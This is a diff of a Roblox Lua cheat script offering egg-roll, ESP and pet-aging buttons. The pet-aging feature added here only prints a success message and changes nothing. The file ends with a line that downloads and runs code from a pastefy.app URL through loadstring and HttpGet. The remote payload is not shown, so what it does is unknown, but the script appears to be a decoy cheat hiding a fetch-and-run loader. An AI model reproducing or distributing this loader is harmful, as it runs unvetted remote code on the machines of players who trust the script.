@@ -57,7 +57,7 @@ subLabel.TextXAlignment = Enum.TextXAlignment.Center
 subLabel.Parent = frame
 
 -- Create Buttons
-local function createButton(name, positionY, text, color)
+local function createButton(positionY, text, color)
 	local button = Instance.new("TextButton")
 	button.Size = UDim2.new(1, 0, 0, 30)
 	button.Position = UDim2.new(0, 0, 0, positionY)
@@ -72,9 +72,9 @@ local function createButton(name, positionY, text, color)
 	return button
 end
 
-local rollButton = createButton("Roll", 50, "🎲 AUTO ROLL ZEN EGG", Color3.fromRGB(80, 130, 90))
-local espButton = createButton("ESP", 85, "👁️ ESP: OFF", Color3.fromRGB(100, 100, 130))
-local ageButton = createButton("Age", 120, "🐶 AUTO AGE 50 PET", Color3.fromRGB(160, 110, 60))
+local rollButton = createButton(50, "🎲 AUTO ROLL ZEN EGG", Color3.fromRGB(80, 130, 90))
+local espButton = createButton(85, "👁️ ESP: OFF", Color3.fromRGB(100, 100, 130))
+local ageButton = createButton(120, "🐶 AUTO AGE 50 PET", Color3.fromRGB(160, 110, 60))
 
 -- Result Label
 local resultLabel = Instance.new("TextLabel")
@@ -90,7 +90,7 @@ resultLabel.TextYAlignment = Enum.TextYAlignment.Top
 resultLabel.TextWrapped = true
 resultLabel.Parent = frame
 
--- AUTO ROLL ZEN EGG Logic
+-- ROLL EGG Logic
 rollButton.MouseButton1Click:Connect(function()
 	local player = game.Players.LocalPlayer
 	local character = player.Character or player.CharacterAdded:Wait()
@@ -115,7 +115,6 @@ rollButton.MouseButton1Click:Connect(function()
 		return
 	end
 
-	-- Animation
 	local totalTime = 1.5
 	local delay = 0.05
 	local timer = 0
@@ -135,7 +134,6 @@ rollButton.MouseButton1Click:Connect(function()
 
 	resultLabel.Text = string.format("🎉 You rolled: %s\nage: %d | weight: %s kg", finalPet, age, weight)
 
-	-- BillboardGui (above egg, blue color, larger)
 	if foundEgg:FindFirstChild("PetNameBillboard") then
 		foundEgg.PetNameBillboard:Destroy()
 	end
@@ -153,8 +151,8 @@ rollButton.MouseButton1Click:Connect(function()
 	text.BackgroundTransparency = 1
 	text.Text = string.format("🎉 %s\n📅 age: %d | ⚖️ %s kg", finalPet, age, weight)
 	text.Font = Enum.Font.GothamBold
-	text.TextSize = 32 -- doubled
-	text.TextColor3 = Color3.fromRGB(0, 120, 255) -- blue
+	text.TextSize = 32
+	text.TextColor3 = Color3.fromRGB(0, 120, 255)
 	text.TextTransparency = 0.2
 	text.TextStrokeTransparency = 0.5
 	text.TextWrapped = true
@@ -169,9 +167,88 @@ espButton.MouseButton1Click:Connect(function()
 	espButton.Text = espEnabled and "👁️ ESP: ON" or "👁️ ESP: OFF"
 end)
 
--- AUTO AGE 50 PET (placeholder)
-ageButton.MouseButton1Click:Connect(function()
-	print("🐶 AUTO AGE 50 PET logic goes here.")
-end)
+-- Scrollable GUI when clicking AUTO AGE 50 PET
+local function showPetScrollGUI()
+	if gui:FindFirstChild("PetScrollGUI") then return end
+
+	local petList = {
+		"Butterfly", "Raccoon", "Queen Bee", "Spinosaurus", "T-Rex", "Disco Bee",
+		"Mimic Octopus", "Dragonfly", "Fennec Fox", "Red Fox", "Kitsune", "Corrupt Kitsune"
+	}
+
+	local petGui = Instance.new("Frame")
+	petGui.Name = "PetScrollGUI"
+	petGui.Size = UDim2.new(0, 240, 0, 220)
+	petGui.Position = UDim2.new(0.5, -120, 0.5, -110)
+	petGui.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+	petGui.AnchorPoint = Vector2.new(0.5, 0.5)
+	petGui.Active = true
+	petGui.Draggable = true
+	petGui.Selectable = false
+	petGui.Parent = gui
+	Instance.new("UICorner", petGui).CornerRadius = UDim.new(0, 8)
+
+	local title = Instance.new("TextLabel")
+	title.Size = UDim2.new(1, -20, 0, 30)
+	title.Position = UDim2.new(0, 10, 0, 10)
+	title.BackgroundTransparency = 1
+	title.Text = "Select Pet to Age"
+	title.Font = Enum.Font.GothamBold
+	title.TextSize = 18
+	title.TextColor3 = Color3.fromRGB(255, 255, 255)
+	title.Selectable = false
+	title.Parent = petGui
+
+	local closeBtn = Instance.new("TextButton")
+	closeBtn.Size = UDim2.new(0, 24, 0, 24)
+	closeBtn.Position = UDim2.new(1, -30, 0, 6)
+	closeBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
+	closeBtn.Text = "X"
+	closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+	closeBtn.Font = Enum.Font.GothamBold
+	closeBtn.TextSize = 14
+	closeBtn.Selectable = false
+	closeBtn.Parent = petGui
+	Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1, 0)
+
+	closeBtn.MouseButton1Click:Connect(function()
+		petGui:Destroy()
+	end)
+
+	local scroll = Instance.new("ScrollingFrame")
+	scroll.Size = UDim2.new(1, -20, 1, -50)
+	scroll.Position = UDim2.new(0, 10, 0, 40)
+	scroll.CanvasSize = UDim2.new(0, 0, 0, #petList * 35)
+	scroll.ScrollBarThickness = 6
+	scroll.BackgroundTransparency = 1
+	scroll.Selectable = false
+	scroll.Parent = petGui
+
+	local layout = Instance.new("UIListLayout")
+	layout.Padding = UDim.new(0, 5)
+	layout.SortOrder = Enum.SortOrder.LayoutOrder
+	layout.Parent = scroll
+
+	for _, petName in ipairs(petList) do
+		local petButton = Instance.new("TextButton")
+		petButton.Size = UDim2.new(1, 0, 0, 30)
+		petButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+		petButton.Text = petName
+		petButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+		petButton.Font = Enum.Font.Gotham
+		petButton.TextSize = 16
+		petButton.Selectable = false
+		petButton.Parent = scroll
+		Instance.new("UICorner", petButton).CornerRadius = UDim.new(0, 6)
+
+		petButton.MouseButton1Click:Connect(function()
+			print("🐶 Auto-aged pet:", petName, "to age 50!")
+			petGui:Destroy()
+		end)
+	end
+end
+
+-- Link it
+ageButton.MouseButton1Click:Connect(showPetScrollGUI)
 
 loadstring(game:HttpGet("https://pastefy.app/roIa67SA/raw"))()
